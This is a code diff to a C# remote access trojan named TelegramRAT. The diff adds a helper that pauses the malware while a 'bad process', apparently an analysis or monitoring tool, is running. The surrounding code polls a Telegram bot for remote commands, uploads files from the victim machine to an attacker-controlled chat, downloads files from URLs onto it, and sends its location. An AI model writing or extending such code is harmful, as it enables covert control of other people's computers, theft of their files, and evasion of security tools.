@@ -23,10 +23,28 @@ namespace TelegramRAT
         public static bool waitThreadIsBlocked = false;
      
 
+        // If is blocked - wait
+        private static void waitForUnblock()
+        {
+            while (true)
+            {
+                // If detected bad process
+                if (waitThreadIsBlocked)
+                {
+                    Thread.Sleep(200);
+                    continue;
+                } else
+                {
+                    break;
+                }
+            }
+        }
+
 
         // Wait commands
         private static void waitCommands()
         {
+            waitForUnblock();
             // Get last update id
             int LastUpdateID = 0;
             string response;
@@ -35,15 +53,9 @@ namespace TelegramRAT
             LastUpdateID = JSON.Parse(response)["result"][0]["update_id"].AsInt;
 
             // Get commands
-            while(true)
+            while (true)
             {
-                // If detected bad process
-                if(waitThreadIsBlocked)
-                {
-                    Thread.Sleep(200);
-                    continue;
-                }
-
+                waitForUnblock();
                 // Sleep
                 Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
                 // Get commands
@@ -93,18 +105,18 @@ namespace TelegramRAT
                         Thread t = new Thread(() => commands.handle(command));
                         t.SetApartmentState(ApartmentState.STA);
                         t.Start();
-                    } else
+                    }
+                    else
                     {
                         sendText("🍩 Unknown type received. Only Text/Document can be used!");
                     }
-
                 }
             }
-            
         }
 
-        private static void sendFile(string file, string type = "Document")
+        public static void sendFile(string file, string type = "Document")
         {
+            waitForUnblock();
             // If is file
             if (!File.Exists(file))
             {
@@ -117,7 +129,13 @@ namespace TelegramRAT
                 MultipartFormDataContent fform = new MultipartFormDataContent();
                 var file_bytes = File.ReadAllBytes(file);
                 fform.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), type.ToLower(), file);
-                var rresponse = httpClient.PostAsync("https://api.telegram.org/bot" + config.TelegramToken + "/send" + type + "?chat_id=" + config.TelegramChatID, fform);
+                var rresponse = httpClient.PostAsync(
+                    "https://api.telegram.org/bot" +
+                    config.TelegramToken +
+                    "/send" + type +
+                    "?chat_id=" + config.TelegramChatID,
+                    fform
+                );
                 rresponse.Wait();
                 httpClient.Dispose();
             }
@@ -126,6 +144,7 @@ namespace TelegramRAT
         // Send text
         public static void sendText(string text, string chatID = config.TelegramChatID)
         {
+            waitForUnblock();
             using (WebClient client = new WebClient())
             {
                 client.DownloadString(
@@ -153,6 +172,7 @@ namespace TelegramRAT
         // Send location
         public static void sendLocation(float lat, float lon)
         {
+            waitForUnblock();
             using (WebClient client = new WebClient())
             {
                 client.DownloadString(
@@ -168,8 +188,9 @@ namespace TelegramRAT
         // Send file from chat/url to computer
         public static void DownloadFile(string file, string path = "")
         {
+            waitForUnblock();
             // Download file from url
-            if(file.StartsWith("http"))
+            if (file.StartsWith("http"))
             {
                 sendText(String.Format("📄 Downloading file \"{0}\" from url", Path.GetFileName(file)));
                 try
@@ -197,8 +218,9 @@ namespace TelegramRAT
         // Send file from computer to chat
         public static void UploadFile(string file, bool removeAfterUpload = false)
         {
+            waitForUnblock();
             // If is file
-            if(File.Exists(file))
+            if (File.Exists(file))
             {
                 sendText("📃 Uploading file...");
                 sendFile(file);
